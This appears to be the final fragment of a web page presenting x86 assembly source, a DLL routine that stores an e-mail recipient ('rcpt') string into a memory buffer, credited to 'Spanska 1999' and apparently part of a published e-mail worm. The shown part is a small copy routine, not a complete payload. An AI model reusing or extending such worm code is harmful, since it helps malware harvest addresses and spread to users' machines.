</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2900</span><span class="sc0">               </span><span class="sc1">;ecx=limite haute memoire</span><span class="sc0">

</span><span class="sc5">cherche_00_suivant</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">stop_stocke_le_rcpt</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cherche_00_suivant</span><span class="sc0">

</span><span class="sc5">stocke_a_cet_offset</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">stop_stocke_le_rcpt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">dll</span><span class="sc0">

</span><span class="sc1">;--------------------------- (c) Spanska 1999 ---------------------------------</span></div></body>
</html>
